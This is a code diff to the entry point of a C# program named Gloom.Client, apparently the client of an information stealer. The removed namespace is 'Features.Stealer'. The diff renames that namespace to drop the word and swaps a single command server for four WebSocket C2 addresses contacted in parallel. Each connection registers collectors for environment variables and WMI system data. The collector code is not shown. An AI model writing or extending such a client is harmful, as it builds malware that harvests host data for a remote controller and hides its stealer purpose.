@@ -1,18 +1,28 @@
-﻿using Gloom.Client.Features.Stealer.InfoCollector;
-using Gloom.Client.Features.Stealer.InfoCollector.Wmi;
+﻿
+using Gloom.Client.Features.InfoCollector;
+using Gloom.Client.Features.InfoCollector.Wmi;
 
 namespace Gloom.Client
 {
 	internal class Program
 	{
-		public const string CommandServer = "ws://127.0.0.1:8683";
+		private static readonly string[] CommandServers = new string[]
+		{
+			"ws://192.168.0.94:8683",
+			"ws://10.0.2.15:8683",
+			"ws://127.0.0.1:8683",
+			"ws://192.168.0.43:8683"
+		};
 
 		static void Main(string[] args)
 		{
-			var client = new MessageClient(new Uri(CommandServer));
-			client.RegisterHandler(new EnvVarsCollector(client));
-			client.RegisterHandler(new WmiInfoCollector(client));
-			client.Run().Wait();
+			SimpleParallel.ForEach(CommandServers, async addr =>
+			{
+				var client = new MessageClient(new Uri(addr));
+				client.RegisterHandler(new EnvVarsCollector(client));
+				client.RegisterHandler(new WmiInfoCollector(client));
+				await client.Run();
+			});
 		}
 	}
 }
